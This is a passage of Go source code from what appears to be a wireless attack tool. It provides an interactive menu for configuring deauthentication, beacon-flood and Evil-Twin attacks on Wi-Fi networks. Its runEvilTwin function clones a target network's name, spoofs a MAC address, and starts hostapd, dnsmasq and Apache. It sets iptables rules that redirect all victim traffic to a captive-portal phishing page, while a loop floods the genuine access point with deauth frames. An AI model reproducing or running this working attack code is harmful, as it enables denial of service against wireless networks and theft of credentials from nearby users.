		if eventdata.Key == keyboard.KeyEnter {
			if libs.IsValidESSID(esdTable) {
				tableinj.ESSID = esdTable
				tableScene, esdTable = 7, ""
				keyboard.Close()
				go regD(nameiface)
			} else {
				var oldScene int = tableScene
				errTable, tableScene = 1, 9
				mutex.Unlock()
				time.Sleep(3 * time.Second)
				mutex.Lock()
				tableScene, esdTable = oldScene, ""
				keyboard.Close()
				go regESSID(nameiface)
			}
			mutex.Unlock()
			return
		}
		if len(esdTable) < 32 {
			if eventdata.Rune == 0 {
				esdTable += " "
			} else {
				esdTable += fmt.Sprintf("%c", eventdata.Rune)
			}
		}
		mutex.Unlock()
	}
}

// Selection of channel from INJ Table
func regCh(nameiface string, ChannelList []int) {
	event, _ := keyboard.GetKeys(10)
	for {
		eventdata := <-event
		mutex.Lock()
		if eventdata.Key == keyboard.KeyEsc {
			openTable = false
			keyboard.Close()
			mutex.Unlock()
			return
		}
		if (eventdata.Key == keyboard.KeyBackspace || eventdata.Key == keyboard.KeyBackspace2) && len(chTable) > 0 {
			chTable = chTable[:len(chTable)-1]
		}
		if eventdata.Key == keyboard.KeyEnter {
			ch, _ := strconv.Atoi(chTable)
			if slices.Contains(ChannelList, ch) {
				tableinj.CHANNEL = ch
				tableScene, chTable = 10, ""
				keyboard.Close()
				go regESSID(nameiface)
			} else {
				var oldScene int = tableScene
				tableScene, errTable = 9, 2
				mutex.Unlock()
				time.Sleep(3 * time.Second)
				mutex.Lock()
				tableScene = oldScene
				chTable = ""
				keyboard.Close()
				go regCh(nameiface, ChannelList)
			}
			mutex.Unlock()
			return
		}
		if len(chTable) < 3 && strings.Contains("0123456789", fmt.Sprintf("%c", eventdata.Rune)) {
			chTable += strings.ToUpper(fmt.Sprintf("%c", eventdata.Rune))
		}
		mutex.Unlock()
	}
}

// Selection of numeric sequence from INJ Table
func reg1234(nameiface string, ChannelList []int) {
	event, _ := keyboard.GetKeys(10)
	for {
		eventdata := <-event
		mutex.Lock()
		if eventdata.Key == keyboard.KeyEsc {
			openTable = false
			keyboard.Close()
			mutex.Unlock()
			return
		}
		if eventdata.Rune == '1' {
			switch tableScene {
			case 1:
				tableScene = 2
				keyboard.Close()
				go regWM("src", nameiface, ChannelList)
			case 3:
				tableinj.DST = libs.GetNoDuplicates(append(tableinj.DST, libs.RandMac()))
				if len(tableinj.SRC) > 1 {
					tableinj.DST = libs.GetNoDuplicates(tableinj.DST)
					tableScene = 7
					keyboard.Close()
					go regD(nameiface)
				} else {
					tableScene = 6
					keyboard.Close()
					go reg1234(nameiface, ChannelList)
				}
			case 5:
				tableScene = 1
				keyboard.Close()
				go reg1234(nameiface, ChannelList)
			case 6:
				tableScene = 3
				keyboard.Close()
				go reg1234(nameiface, ChannelList)
			}
			mutex.Unlock()
			return
		} else if eventdata.Rune == '2' {
			switch tableScene {
			case 1:
				switch tableinj.INJ {
				case "De-Auth":
					tableinj.SRC = libs.GetNoDuplicates(append(tableinj.SRC, maps.Keys(analysisData.DeviceData)...))
					tableScene = 5
					keyboard.Close()
					go reg1234(nameiface, ChannelList)
				case "Beacon":
					tableinj.SRC = libs.GetNoDuplicates(append(tableinj.SRC, libs.RandMac()))
					tableScene = 11
					keyboard.Close()
					go regCh(nameiface, ChannelList)
				}
			case 3:
				tableinj.DST = libs.GetNoDuplicates(append(tableinj.DST, "ffffffffffff"))
				if len(tableinj.SRC) > 1 {
					tableScene = 7
					keyboard.Close()
					go regD(nameiface)
				} else {
					tableScene = 6
					keyboard.Close()
					go reg1234(nameiface, ChannelList)
				}
			case 5:
				tableScene = 3
				keyboard.Close()
				go reg1234(nameiface, ChannelList)
			case 6:
				tableScene = 7
				keyboard.Close()
				go regD(nameiface)
			}
			mutex.Unlock()
			return
		} else if eventdata.Rune == '3' {
			switch tableScene {
			case 3:
				tableScene = 4
				keyboard.Close()
				go regWM("dst", nameiface, ChannelList)
				mutex.Unlock()
				return
			}
		} else if eventdata.Rune == '4' && tableinj.INJ == "De-Auth" && len(tableinj.SRC) == 1 {
			if stations := getStationsFromBSSIDs(tableinj.SRC); len(stations) > 0 {
				tableinj.DST = libs.GetNoDuplicates(append(tableinj.DST, stations...))
				tableScene = 6
				keyboard.Close()
				go reg1234(nameiface, ChannelList)
				mutex.Unlock()
				return
			} else {
				var oldScene int = tableScene
				tableScene, errTable = 9, 2
				mutex.Unlock()
				time.Sleep(3 * time.Second)
				mutex.Lock()
				tableScene = oldScene
				keyboard.Close()
				go reg1234(nameiface, ChannelList)
				mutex.Unlock()
				return
			}
		}
		mutex.Unlock()
	}
}

// Selection of MAC Address/hex characters from INJ Table
func regWM(way string, nameiface string, ChannelList []int) {
	event, _ := keyboard.GetKeys(10)
	for openTable {
		eventdata := <-event
		mutex.Lock()
		if eventdata.Key == keyboard.KeyEsc {
			openTable = false
			keyboard.Close()
			mutex.Unlock()
			return
		}
		if eventdata.Key == keyboard.KeyBackspace || eventdata.Key == keyboard.KeyBackspace2 {
			if way == "src" && len(srcTable) > 0 {
				srcTable = srcTable[:len(srcTable)-1]
			} else if way == "dst" && len(dstTable) > 0 {
				dstTable = dstTable[:len(dstTable)-1]
			}
		}
		if strings.Contains("abcdefABCDEF1234567890", fmt.Sprintf("%c", eventdata.Rune)) {
			if way == "src" {
				srcTable += strings.ToUpper(fmt.Sprintf("%c", eventdata.Rune))
				if len(srcTable) >= 12 {
					switch tableinj.INJ {
					case "De-Auth":
						if getChFromSaved(srcTable) != -1 {
							tableinj.SRC = libs.GetNoDuplicates(append(tableinj.SRC, srcTable))
							srcTable, tableScene = "", 5
							keyboard.Close()
							go reg1234(nameiface, ChannelList)
						} else {
							var oldScene int = tableScene
							tableScene, errTable = 9, 1
							mutex.Unlock()
							time.Sleep(3 * time.Second)
							mutex.Lock()
							tableScene, srcTable = oldScene, ""
							keyboard.Close()
							go regWM("src", nameiface, ChannelList)
						}
					case "Beacon":
						tableinj.SRC = libs.GetNoDuplicates(append(tableinj.SRC, srcTable))
						srcTable, tableScene = "", 11
						keyboard.Close()
						go regCh(nameiface, ChannelList)
					case "Evil-Twin":
						if tableinj.CHANNEL = getChFromSaved(srcTable); tableinj.CHANNEL != -1 {
							tableinj.SRC = []string{srcTable}
							tableinj.ESSID = analysisData.DeviceData[libs.Fmac(srcTable)].Essid
							tableScene, openTable, srcTable = 0, false, ""
							keyboard.Close()
							panicExit = true
							mutex.Unlock()
							time.Sleep(150 * time.Millisecond)
							runEvilTwin(nameiface)
							return
						} else {
							var oldScene int = tableScene
							tableScene, errTable = 9, 1
							mutex.Unlock()
							time.Sleep(3 * time.Second)
							mutex.Lock()
							tableScene, srcTable = oldScene, ""
							keyboard.Close()
							go regWM("src", nameiface, ChannelList)
						}
					}
					mutex.Unlock()
					return
				}
			} else if way == "dst" {
				dstTable += strings.ToUpper(fmt.Sprintf("%c", eventdata.Rune))
				if len(dstTable) >= 12 {
					tableinj.DST = libs.GetNoDuplicates(append(tableinj.DST, dstTable))
					dstTable = ""
					if len(tableinj.SRC) > 1 {
						tableScene = 7
						keyboard.Close()
						go regD(nameiface)
					} else {
						tableScene = 6
						keyboard.Close()
						go reg1234(nameiface, ChannelList)
					}
					mutex.Unlock()
					return
				}
			}
		}
		mutex.Unlock()
	}
}

/* Analyzer worker, it run channel switcher, packet handler, management of table, INJ table hotkey recorder (CTRL-T), pause func hotkey recorder (CTRL-E) */
func engine(channelList []int, prefix string) {
	channelChanger(channelList)
	go func() {
		handle = libs.GetMonitorSniffer(nameiface, color)
		go handlePacket(handle, channelList, prefix, true, false)
		if !disableInactiver {
			go moveActiveToInactive()
		}
		for {
			time.Sleep(time.Millisecond * 100)
			if paused {
				for {
					time.Sleep(time.Millisecond * 100)
					if !paused {
						if !disableInactiver {
							resetPreActive()
						}
						handle = libs.GetMonitorSniffer(nameiface, color)
						go handlePacket(handle, channelList, prefix, true, false)
						if !disableInactiver {
							go moveActiveToInactive()
						}
						break
					}
				}
			}
		}
	}()
	go func() { // old regE func
		var regKey *hotkey.Hotkey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyE)
		regKey.Register()
		defer regKey.Unregister()
		for {
			<-regKey.Keydown()
			<-regKey.Keyup()
			mutex.Lock()
			if paused {
				libs.SetMonitorMode(nameiface)
				paused = false
			} else {
				libs.SetManagedMode(nameiface)
				paused = true
			}
			mutex.Unlock()
		}
	}()
	go func(channelList []int) { // old regT func
		var regKey *hotkey.Hotkey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyT)
		regKey.Register()
		defer regKey.Unregister()
		for {
			<-regKey.Keydown()
			<-regKey.Keyup()
			mutex.Lock()
			keyboard.Close()
			if !openTable {
				tableinj = libs.INJTable{}
				srcTable, dstTable, esdTable, tableScene, errTable, openTable = "", "", "", 0, 0, true
				go regXINJ(nameiface, channelList)
			} else {
				openTable, injection = false, false
			}
			mutex.Unlock()
		}
	}(channelList)
	update()
}

// Sort info and print completed table
func printChart(offline bool) {
	var deviceDataSort []string
	var clientDataSort []string
	mutex.Lock()
	for bssid := range analysisData.DeviceData {
		deviceDataSort = append(deviceDataSort, bssid)
	}
	sort.Strings(deviceDataSort)
	for _, bssid := range deviceDataSort {
		if rssiRadar {
			chartBSSID.AddRow(bssid, fmt.Sprintf("%s ", analysisData.DeviceData[bssid].Enc), analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Beacons, analysisData.DeviceData[bssid].Data, analysisData.DeviceData[bssid].Ch, analysisData.DeviceData[bssid].Essid, analysisData.DeviceData[bssid].Manufacturer, libs.RadioLocalize(analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Ch, radarconf))
		} else {
			chartBSSID.AddRow(bssid, fmt.Sprintf("%s ", analysisData.DeviceData[bssid].Enc), analysisData.DeviceData[bssid].Power, analysisData.DeviceData[bssid].Beacons, analysisData.DeviceData[bssid].Data, analysisData.DeviceData[bssid].Ch, analysisData.DeviceData[bssid].Essid, analysisData.DeviceData[bssid].Manufacturer)
		}
	}
	if !onlyBeacon {
		for mac := range analysisData.ClientData {
			clientDataSort = append(clientDataSort, mac)
		}
		sort.Strings(clientDataSort)
		for _, mac := range clientDataSort {
			if rssiRadar {
				chartCLIENT.AddRow(mac, analysisData.ClientData[mac].Bssid, analysisData.ClientData[mac].Power, analysisData.ClientData[mac].Data, analysisData.ClientData[mac].Essid, analysisData.ClientData[mac].Manufacturer, libs.RadioLocalize(analysisData.ClientData[mac].Power, analysisData.DeviceData[strings.ToLower(analysisData.ClientData[mac].Bssid)].Ch, radarconf))
			} else {
				chartCLIENT.AddRow(mac, analysisData.ClientData[mac].Bssid, analysisData.ClientData[mac].Power, analysisData.ClientData[mac].Data, analysisData.ClientData[mac].Essid, analysisData.ClientData[mac].Manufacturer)
			}
		}
	}
	mutex.Unlock()
	libs.ScreenClear()
	fmt.Print("\n" + libs.GetRow1(color, capturedEapol, globalChannel, elapsedTime, offline))
	chartBSSID.Print()
	fmt.Println()
	if !onlyBeacon || len(analysisData.ClientData) != 0 {
		chartCLIENT.Print()
		if !offline {
			fmt.Println()
		}
	}
	if !offline {
		mutex.Lock()
		fmt.Print(libs.GetRow2(color, paused, openTable, tableScene, tableinj, srcTable, dstTable, esdTable, seqdatalist, errTable, chTable))
		mutex.Unlock()
	}
	chartBSSID.SetRows(nil)
	chartCLIENT.SetRows(nil)
	if paused {
		var elapsedTimePause time.Time = time.Now()
		for paused {
			time.Sleep(100 * time.Millisecond)
		}
		elapsedTime = elapsedTime.Add(time.Since(elapsedTimePause))
	}
	if panicExit {
		return
	}
}

// Preliminaries (same setup()) for ONLY pcap file reading
func loaderSetupView(file string) {
	color = libs.SetupColors()
	libs.PrintLogo(color, "Initializing...")
	go libs.Loading(fmt.Sprintf("%s[%sINIT%s] Loading pcap file", color.White, color.Green, color.White), mt)
	time.Sleep(1200 * time.Millisecond)
	handle, err := pcap.OpenOffline(file)
	elapsedTime = time.Now().Add(-handle.Resolution().ToDuration())
	if err != nil {
		mt <- true
		fmt.Println()
		libs.SignalError(color, "Error to reading selected file. (Data is present?)")
	}
	defer handle.Close()
	var warning bool
	macdb, warning = jsonreader.ReadMacdb()
	if warning {
		libs.Error(color, "Failure to read the manufacturer db.")
		time.Sleep(1200 * time.Millisecond)
	}
	setupChart()
	handlePacket(handle, libs.G5g24Channels[:], "?", false, true)
	if len(analysisData.DeviceData) <= 0 {
		mt <- true
		fmt.Println()
		libs.SignalError(color, "No valid resources loaded.")
	}
	time.Sleep(1200 * time.Millisecond)
	mt <- true
	time.Sleep(1 * time.Second)
}

// deepScanning function that scan single target and get info
func deepScanning(channelList []int, bssid string) {
	var stage int = 1
	var deviceDBM int
	var info libs.InfoSingleDevice
	var isClient bool
	var srcmac string
	var dbmreg []int
	var stagemsg []string = []string{"Detecting target",
		"Analysis target",
		"Finalization of target's data"}
	sngtrgLoading = true
	var customRadarconf jsonreader.RadarConf = radarconf
	time.Sleep(1 * time.Second)
	for stage < 4 {
		if stage == 1 {
			libs.PrintLogo(color, "Running scan mode...")
			libs.Log(color, "Gapcast's target scanner started.")
			fmt.Println()
			time.Sleep(2 * time.Second)
		}
		if stage != 4 {
			go libs.Loading(fmt.Sprintf("%s[%sSCAN%s] Stage %d <%s%s%s>", color.White, color.Green, color.White, stage, color.Purple, stagemsg[stage-1], color.White), chanstage)
		}
		time.Sleep(1 * time.Second)
		switch stage {
		case 1:
			channelChanger(channelList)
			handle = libs.GetMonitorSniffer(nameiface, color)
			go handlePacket(handle, channelList, "?", false, false)
			for {
				time.Sleep(time.Second * 5)
				mutex.Lock()
				if info1, exist1 := analysisData.DeviceData[strings.ToUpper(bssid)]; exist1 {
					isClient = false
					info = libs.InfoSingleDevice{Essid: info1.Essid, Manufacturer: info1.Manufacturer, Channel: info1.Ch}
					srcmac = strings.ToUpper(bssid)
					mutex.Unlock()
					break
				} else if info2, exist2 := analysisData.ClientData[strings.ToUpper(bssid)]; exist2 {
					isClient = true
					info = libs.InfoSingleDevice{Essid: info2.Essid, Manufacturer: info2.Manufacturer, Channel: analysisData.DeviceData[info2.Bssid].Ch}
					srcmac = strings.ToUpper(info2.Bssid) // srcmac on this line is AP bssid
					mutex.Unlock()
					break
				}
				mutex.Unlock()
			}
			panicExit = true
			chanstage <- true
		case 2:
			var handle *pcap.Handle = libs.GetMonitorSniffer(nameiface, color)
			var packets *gopacket.PacketSource = gopacket.NewPacketSource(handle, handle.LinkType())
			defer handle.Close()
			singleChannel = true
			channelChanger([]int{info.Channel})
			var scantime time.Time = time.Now()
			for packet := range packets.Packets() {
				if packet.ErrorLayer() == nil && packet != nil && packet.Layer(layers.LayerTypeDot11) != nil {
					if PWR, err := libs.GetDBM(packet); !err {
						if TRS, RCV, err := libs.GetAPSTAData(packet); !err {
							if strings.EqualFold(RCV, srcmac) {
								info.ReceivedPKT++
							} else if strings.EqualFold(TRS, srcmac) {
								dbmreg = append(dbmreg, int(PWR))
								info.SendedPKT++
							}
							if dot11 := packet.Layer(layers.LayerTypeDot11).(*layers.Dot11); dot11.Type.MainType() == layers.Dot11TypeCtrl {
								info.SndRcvACK++
							}
						}
					}
				}
				if int64(time.Since(scantime).Seconds()) > 20 {
					if info.SendedPKT > 0 {
						break
					} else {
						scantime = time.Now()
						continue
					}
				}
			}
			chanstage <- true
		case 3:
			sort.Ints(dbmreg)
			var drlen = int(math.Round(float64(len(dbmreg) / 2)))
			if len(dbmreg)%2 == 0 {
				deviceDBM = (dbmreg[drlen-1] + dbmreg[drlen]) / 2
			} else {
				deviceDBM = dbmreg[drlen]
			}
			radarconf, _ = jsonreader.ReadRadarConf()
			for _, dbmlevel := range []float64{2, 3, 5} {
				radarconf.TXAntennaDBI = dbmlevel
				switch dbmlevel {
				case 2:
					info.PowerLOW = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
				case 3:
					info.PowerMID = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
				case 5:
					info.PowerHIGH = libs.RadioLocalize(deviceDBM, info.Channel, radarconf)
				}
			}
			chanstage <- true
		}
		time.Sleep(1 * time.Second)
		stage++
	}
	sngtrgLoading = false
	fmt.Printf("\n%sAnalysis's response\n", color.White)
	fmt.Printf("%s>  %s\n\n", color.White, strings.Repeat("=", 25))
	fmt.Printf("%s     | [%sESSID%s]       %s\n", color.White, color.Blue, color.White, info.Essid)
	var infonames []string = []string{"BSSID", "CHANNEL", "VENDOR", "SENDED-PKT", "RECEVD-PKT", "ACK", "RECEVD-DBM", "ANT-2DBI", "ANT-3DBI", "ANT-5DBI"}
	for idxname, infoelem := range []interface{}{srcmac,
		info.Channel,
		info.Manufacturer,
		info.SendedPKT,
		info.ReceivedPKT,
		info.SndRcvACK,
		fmt.Sprintf("%d dBm", deviceDBM),
		info.PowerLOW,
		info.PowerMID,
		info.PowerHIGH} {
		fmt.Printf("%s     | [%s%s%s]%s %v\n", color.White, color.Blue, infonames[idxname], color.White, strings.Repeat(" ", 11-len(infonames[idxname])), infoelem)
	}
	var deviceType string
	switch isClient {
	case true:
		deviceType = "STATION"
	case false:
		deviceType = "ACCESS-POINT"
	}
	if tdaPresent || rdaPresent || pddPresent {
		fmt.Printf("%s     | [%sCUSTM-CONF%s]  %s\n", color.White, color.Blue, color.White, libs.RadioLocalize(deviceDBM, info.Channel, customRadarconf))
	}
	fmt.Printf("%s     | [%sDEVICE-TYPE%s] %s\n", color.White, color.Blue, color.White, deviceType)
	fmt.Printf("\n%s   %s\n\n", color.White, strings.Repeat("=", 25))
}

// Run Evil Twin attack with captive portal function
func runEvilTwin(nameiface string) {
	var nodeauthStarting bool = false
	path, _ := os.Getwd()
	var handle2 *pcap.Handle
	var webmodel string
	apnameiface = nameiface
	tableinj.ESSID = fmt.Sprintf(" %s", tableinj.ESSID)
	for step := 0; step < 2; step++ {
		switch step {
		case 0:
			for {
				time.Sleep(350 * time.Millisecond)
				libs.PrintLogo(color, "Setup Evil-Twin attack...")
				time.Sleep(1 * time.Second)
				if files, err := os.ReadDir(fmt.Sprintf("%s/EvilTwin/models", path)); err == nil && len(files) > 0 {
					var modelsfound []string
					for _, file := range files {
						subfiles, _ := os.ReadDir(fmt.Sprintf("%s/EvilTwin/models/%s", path, file.Name()))
						for _, subfile := range subfiles {
							if subfile.Name() == "DESCRIPTION" {
								modelsfound = append(modelsfound, file.Name())
							}
						}
					}
					if len(modelsfound) > 0 {
						var found bool = false
						var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 5, ' ', 0)
						fmt.Fprintf(writer, "%s\tIndex\tModel\tDescription\n", color.White)
						for index, model := range modelsfound {
							var emptyModel bool = true
							var modelTitle, modelDescription string = "", "Not available"
							if descr, err := os.ReadFile(fmt.Sprintf("%s/EvilTwin/models/%s/DESCRIPTION", path, model)); err == nil {
								for _, descrline := range strings.Split(string(descr), "\n") {
									if strings.HasPrefix(descrline, "&TITLE:") {
										modelTitle, _ = strings.CutPrefix(descrline, "&TITLE:")
										if len(modelTitle) > 0 {
											emptyModel, found = false, true
										}
										modelTitle = strings.ReplaceAll(strings.Trim(modelTitle, " "), "\r", "")
									} else if strings.HasPrefix(descrline, "&DESCRIPTION:") {
										modelDescription, _ = strings.CutPrefix(descrline, "&DESCRIPTION:")
										modelDescription = strings.ReplaceAll(strings.Trim(modelDescription, " "), "\r", "")
									}
								}
							}
							if !emptyModel {
								fmt.Fprintf(writer, "%s\t%d\t%s\t%s\n", color.White, index, modelTitle, modelDescription)
								emptyModel = true
							}
						}
						if found {
							writer.Flush()
							var modelindexScan string
							time.Sleep(1500 * time.Millisecond)
							fmt.Printf("\n%s[%sINPUT%s] Select available model [0-%s]: ", color.White, color.Green, color.White, strconv.Itoa(len(modelsfound)-1))
							fmt.Scanln(&modelindexScan)
							fmt.Println()
							if modelindexScan == "" {
								libs.Error(color, "Selection error, updating...")
								time.Sleep(2 * time.Second)
								continue
							} else if modelindex, err := strconv.Atoi(modelindexScan); err == nil {
								if modelindex < 0 || modelindex > len(modelindexScan) {
									libs.Error(color, "Selection error, updating...")
									time.Sleep(2 * time.Second)
									continue
								} else {
									webmodel = fmt.Sprintf("%s/EvilTwin/models/%s/html", path, modelsfound[modelindex])
									break
								}
							} else {
								libs.Error(color, "Selection error (is number?), updating...")
								time.Sleep(2 * time.Second)
								continue
							}
						}
					}
				}
				libs.SignalError(color, "No valid web-page model found.")
			}
		case 1:
			time.Sleep(350 * time.Millisecond)
			libs.PrintLogo(color, "Setup Evil-Twin attack...")
			time.Sleep(1 * time.Second)
			var ifacesFound bool = false
			var avifaces []libs.Ifaces
			var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 5, ' ', 0)
			fmt.Fprintf(writer, "%s\tIndex\tInterface\tDriver\tChipset\n", color.White)
			for _, iface := range libs.ShowIfaces() {
				if apnameiface == iface.Name {
					continue
				} else if ifaceinfo, err := libs.GetIfaceInfo(iface.Name); !err {
					avifaces = append(avifaces, libs.Ifaces{Name: iface.Name})
					ifacesFound = true
					fmt.Fprintf(writer, "%s\t%s\t%s\t%s\t%s", color.White, strconv.Itoa(len(avifaces)-1), iface.Name, ifaceinfo[3], ifaceinfo[4])
				}
			}
			if ifacesFound {
				writer.Flush()
				var ifaceindexScan string
				time.Sleep(1500 * time.Millisecond)
				fmt.Printf("\n\n%s[%sINPUT%s] Select available network interface for De-Auth [0-%s] (default: no-adapter mode): ", color.White, color.Green, color.White, strconv.Itoa(len(avifaces)-1))
				fmt.Scanln(&ifaceindexScan)
				fmt.Println()
				if ifaceindexScan == "" {
					libs.NOTIMECustomLog(color, color.Blue, "LOG", "Starting without De-Auth injection...")
					nodeauthStarting = true
					time.Sleep(3 * time.Second)
				} else if ifaceindex, err := strconv.Atoi(ifaceindexScan); err == nil {
					if ifaceindex < 0 || ifaceindex > len(avifaces) {
						libs.Error(color, "Selection error, updating...")
						time.Sleep(2 * time.Second)
					} else {
						nameiface = avifaces[ifaceindex].Name
						if !libs.MonSupportCheck(nameiface) {
							libs.Error(color, fmt.Sprintf("%s don't support monitor mode, updating...", apnameiface))
							time.Sleep(2 * time.Second)
						} else if tableinj.CHANNEL > 14 && !libs.G5Check(nameiface) {
							libs.Error(color, fmt.Sprintf("%s don't support 5 Ghz (iface's channel: %d), updating...", apnameiface, tableinj.CHANNEL))
							time.Sleep(2 * time.Second)
						} else {
							fmt.Printf("%s[%sLOG%s] %s: Setting up monitor mode ... ", color.White, color.Blue, color.White, nameiface)
							if err := libs.SetMonitorMode(nameiface); err {
								fmt.Printf("%sFAIL\n\n%s", color.Red, color.White)
								libs.Error(color, "Bad interface.")
								time.Sleep(2 * time.Second)
							} else {
								time.Sleep(1200 * time.Millisecond)
								handle2 = libs.GetMonitorSniffer(nameiface, color)
								fmt.Println("Done")
								time.Sleep(2 * time.Second)
								break
							}
						}
					}
				} else {
					libs.Error(color, "Selection error (is number?), updating...\n")
					time.Sleep(2 * time.Second)
				}
			} else {
				libs.PrintLogo(color, "Setup Evil-Twin attack...")
				libs.Warning(color, "No valid interface found: Starting without De-Auth injection...\n")
				nodeauthStarting = true
				apnameiface = nameiface
				time.Sleep(3 * time.Second)
			}
		}
	}
	var trycounter int = 0
	var errorRetry bool = false
	for trycounter < 3 {
		trycounter++
		libs.PrintLogo(color, "Setup Evil-Twin attack...")

		if libs.IsRunning("hostapd") || libs.IsRunning("dnsmasq") {
			libs.Rtexec(exec.Command("bash", "-c", "killall hostapd dnsmasq"))
			libs.Log(color, "Killing hostapd and dnsmasq process ... Done")
		}
		var changedMac string
		if tableinj.SRC[0][len(tableinj.SRC[0])-1] == 1 {
			changedMac = tableinj.SRC[0][:len(tableinj.SRC[0])-1] + "2"
		} else {
			changedMac = tableinj.SRC[0][:len(tableinj.SRC[0])-1] + "1"
		}

		var ETSetupCommands []string = []string{
			"echo -e \"interface=br0\nlisten-address=10.1.1.1\nno-hosts\ndhcp-range=10.1.1.2,10.1.1.254,10m\ndhcp-option=option:router,10.1.1.1\ndhcp-authoritative\naddress=/#/10.1.1.1\" > /etc/dnsmasq.conf",
			fmt.Sprintf("echo -e \"interface=%s\nssid=%s\nhw_mode=g\nieee80211n=1\nchannel=%d\nwmm_enabled=1\nauth_algs=1\nbridge=br0\" > %s/config/apconf", apnameiface, tableinj.ESSID, tableinj.CHANNEL, path),
			fmt.Sprintf("echo -e \"<Directory /var/www/>\n    Options Indexes FollowSymLinks MultiViews\n    AllowOverride All\n    Order Allow,Deny\n    Allow from all\n</Directory>\" %s/etc/apache2/conf-available/override.conf", path),
			"cd /etc/apache2/conf-enabled && ln -f -s ../conf-available/override.conf override.conf && cd /etc/apache2/mods-enabled && ln -f -s ../mods-available/rewrite.load rewrite.load && rm /var/log/apache2/access.log && touch /var/log/apache2/access.log",
			fmt.Sprintf("cp -Rf %s /var/www/ && cp -f EvilTwin/.htaccess /var/www/html && chown -R www-data:www-data /var/www/html && chown root:www-data /var/www/html/.htaccess", webmodel),
			fmt.Sprintf("ifconfig %s down", apnameiface),
			fmt.Sprintf("macchanger -m %s %s", libs.Fmac(changedMac), apnameiface),
			fmt.Sprintf("ifconfig %s up", apnameiface),
			fmt.Sprintf("rm %s/log/hostapd.log", path),
			fmt.Sprintf("hostapd %s/config/apconf | tee %s/log/hostapd.log", path, path),
			"ifconfig br0 up",
			"ifconfig br0 10.1.1.1 netmask 255.255.255.0",
			"sysctl net.ipv4.ip_forward=1",
			"iptables --flush",
			"iptables -t nat --flush",
			"iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53",
			"iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80",
			"iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:80",
			"iptables -t nat -A POSTROUTING -j MASQUERADE",
			"service dnsmasq start & service dnsmasq restart",
			"service apache2 start & service apache2 restart"}
		var ETSetupStatus []string = []string{
			"Creating dnsmasq config file",
			"Creating hostapd config file",
			"Creating apache2 config file",
			"Setup Apache2 config",
			"Setup web-site",
			"",
			fmt.Sprintf("Changing MAC address [%s]", libs.Fmac(changedMac)),
			"",
			"Resetting hostapd config",
			"Running hostapd",
			"",
			"Setup AP network interface",
			"Enabling IPv4 forwarding",
			"Resetting iptables config",
			"Resetting iptables NAT config",
			"Set iptables config (1/4)",
			"Set iptables config (2/4)",
			"Set iptables config (3/4)",
			"Set iptables config (4/4)",
			"Starting dnsmasq",
			"Starting apache2 server"}
		var ETSetupWait []int = []int{300, 300, 300, 600, 600, 1000, 1500, 1000, 400, 4000, 2000, 2000, 300, 200, 200, 100, 100, 100, 100, 2000, 500}
		panicExit, eviltwinAcc = false, true
		for seqindex := 0; seqindex < 21; seqindex++ {
			if panicExit {
				eviltwinQuit = true
				return
			}
			if ETSetupStatus[seqindex] != "" {
				fmt.Printf("%s[%s%s%s] [%sLOG%s] %s ... ", color.White, color.Yellow, time.Now().Format("15:04:05"), color.White, color.Blue, color.White, ETSetupStatus[seqindex])
			}
			var err bool
			var msgerr string
			if seqindex != 9 {
				msgerr, err = libs.Rtexec(exec.Command("bash", "-c", ETSetupCommands[seqindex]))
			} else {
				go libs.Rtexec(exec.Command("bash", "-c", ETSetupCommands[seqindex]))
				err = false
			}
			time.Sleep(time.Duration(ETSetupWait[seqindex]) * time.Millisecond)
			if ETSetupStatus[seqindex] != "" {
				if err && strings.Contains(msgerr, "SAME MAC") {
					fmt.Printf("%sFAIL\n\n%s", color.Red, color.White)
					libs.Log(color, "Retrying...")
					time.Sleep(2 * time.Second)
					errorRetry = true
					break
				} else {
					fmt.Print("Done\n")
					time.Sleep(150 * time.Millisecond)
				}
			}
		}
		if errorRetry {
			errorRetry = false
			continue
		}
		fmt.Println()
		libs.CustomLog(color, color.Blue, "AP-INFO", fmt.Sprintf("ESSID: '%s', BSSID: %s, CH: %d\n", tableinj.ESSID, libs.Fmac(changedMac), tableinj.CHANNEL))
		os.Remove(infograbfile)
		var logFiles []string = []string{path + "/log/hostapd.log", infograbfile, apache2logFile}
		var logFilesTitle []string = []string{"HOSTAPD-LOG", "WEBSITE-LOG", "WEBSITE-LOG"}
		var loglines []int = []int{0, 0, 0}
		var ClientsIPDetected []string = []string{}
		ETLogRead, eviltwinMode = true, true
		if !nodeauthStarting {
			go func() {
				time.Sleep(1 * time.Second)
				libs.ChangeChannel(nameiface, tableinj.CHANNEL)
				libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Started injection to [%s%s%s] with %sDe-Auth%s (%sReason 7%s)", color.Green, color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
				for !panicExit {
					for seq := 0; seq < 64; seq++ {
						if panicExit {
							break
						}
						if success := injpacket.InjectPacket(handle2, nameiface, tableinj.CHANNEL, tableinj.CHANNEL, injpacket.Deauth(tableinj.SRC[0], "", seq)); !success {
							libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Injection error to [%s%s%s] with %sDe-Auth%s (%sReason 7%s) | (Can't inject packet?)", color.Green, color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
							time.Sleep(1200 * time.Millisecond)
							break
						}
						time.Sleep(2 * time.Millisecond)
					}
					time.Sleep(180 * time.Millisecond)
				}
				libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Quitted injection to [%s%s%s] with %sDe-Auth%s (%sReason 7%s)", color.Green, color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
			}()
		}
